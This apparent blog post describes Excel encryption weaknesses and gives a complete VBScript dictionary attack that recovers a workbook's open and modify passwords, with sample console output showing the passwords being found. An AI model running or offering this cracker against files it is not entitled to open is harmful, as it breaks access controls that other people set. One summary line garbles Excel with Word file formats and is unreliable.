---
title:  "Dictionary Attack on Excel Passwords"
---

![Logo](/assets/images/tux-root.png)

## Context 

When thinking about the security of encrypted Excel documents, I found a great article analyzing security of encryption algorithms for Excel spreadsheets [1]. The bottom line is that:
Encryption in Excel 2007 IS secure only for ".docx". For ".doc" it's NOT secure with default settings
Encryption in Excel 2002 and 2003 IS secure, but NOT when used with default settings!
Encryption in Excel 95, 97 and 2000 is NOT secure at all.
Instructions on how to make sure you're using the most secure algorithms and how to change the default settings in the referenced link.

## How to set/change password to open and password to modify
Changing/removing the password to open a file is pretty straight-forward in Excel 2007-2010: from the File menu, chose Info, then Encrypt with password. 
Changing the password to modify I found is not so straight-forward. To set/remove a "read-only" password, from the Save or Save As dialog boxes, select General Options from the Tools drop-down menu to open the General Options dialog box. There, in the Password to modify box, you can enter the new password or blank to remove the current one. 

## Dictionary attack
If the password is a dictionary word, then it's pretty easy to find it. I've made a small vbs script to attack these 2 passwords (password to open and password to modify)  using words from a dictionary file. This could also be extended to something like the rules in jtr to intelligently guess/brute-force more passwords, based on tendencies (e.g. KoreLogic John rules [3]). 
It's just a proof of concept, and it's very slow, it could be extended to use more threads or optimized.
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
' *****************************************************************
' Dictionary attack on Excel passwords
'
' Uses Workbooks.open method and a password dictionary to test:
' 1) password to open 
' 2) password for write access, using open password
'
' Usage: "CScript excel-pw-attack.vbs <test .xls=""> <words .dic="">"
'
' Full Description:
' http://insecure.tk/......
' *****************************************************************
Option Explicit
On Error Resume Next
 
Dim objExcel
Set objExcel = WScript.CreateObject("Excel.Application")
objExcel.visible=False
 
Dim args
if WScript.Arguments.Count < 2 or WScript.Arguments.Count > 3 then
   WScript.Echo "Usage: "
   WScript.Echo "Search password for open: "
   WScript.Echo "   CScript " & WScript.ScriptName & " <excel file=""> <dictionary file="">"
   WScript.Echo "Search password for modify, using password to open: "
   WScript.Echo "   CScript " & WScript.ScriptName & " <excel file=""> <dictionary file=""> <open password="">"
   WScript.Quit 1
end if
 
' Excel file should be in the script's directory
Dim xlsFile, currentPath
currentPath = replace(WScript.ScriptFullName, WScript.ScriptName, "")
xlsFile = currentPath & WScript.Arguments(0)
WScript.Echo "Brute-forcing excel file: " & xlsFile
WScript.Echo "Using dictionary file: " & WScript.Arguments(1)
if WScript.Arguments.Count = 3 then
 WScript.Echo "Using open password " & WScript.Arguments(2) & " to get the write password"
end if
 
' Read the passwords from the dictionary file
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")
 
Dim objFile
Const ForReading = 1
Set objFile = objFSO.OpenTextFile(currentPath & WScript.Arguments(1), ForReading)
 
Dim currLine, bFound
bFound = False
While Not bFound And Not objFile.AtEndOfStream
 currLine = objFile.ReadLine
 WScript.Echo "[*] Testing solution " & currLine
 if WScript.Arguments.Count = 3 then
  objExcel.Workbooks.Open xlsFile, , , , WScript.Arguments(2), currLine
 else
  ' Try to open it in read-only mode
  objExcel.Workbooks.Open xlsFile, ,True , , currLine
 end if
 if Err.Number >  0 then
  'WScript.Echo Err.Description & Err.Number
  Err.Clear
 else
  bFound = True
  if WScript.Arguments.Count = 3 then
   WScript.Echo "[+] Found password for modifying: " & currLine
  else
   WScript.Echo "[+] Found password for opening: " & currLine
  end if
 end If
Wend
 
if not bFound then
 if WScript.Arguments.Count = 3 then
  WScript.Echo "[-] Not found password for modifying."
 else
  WScript.Echo "[-] Not found password for opening."
 end if
end if
 
 
objExcel.Workbooks.Close
objFile.close
</open></dictionary></excel></dictionary></excel></words></test>
An example of how to use it on a test document with these 2 passwords set:
1. Find password to open:
?
1
2
3
4
5
6
7
>cscript excel-pw-attack.vbs test.xls words_en.txt
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.
 
Brute-forcing excel file: C:\...\test.xls
Using dictionary file: words_en.txt
[+] Found password for opening: rock
2. Find password to modify: 
?
1
2
3
4
5
6
7
8
>cscript excel-pw-attack.vbs test.xls words_en.txt rock
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.
 
Brute-forcing excel file: C:\...\test.xls
Using dictionary file: words_en.txt
Using open password rock to get the write password
[+] Found password for modifying: paper


## References
[1] How safe is Excel encryption?
[2] Excel 2007 Encryption Strength
[3] KoreLogic custom password rules for John
[4] excel-pw-crack.vbs
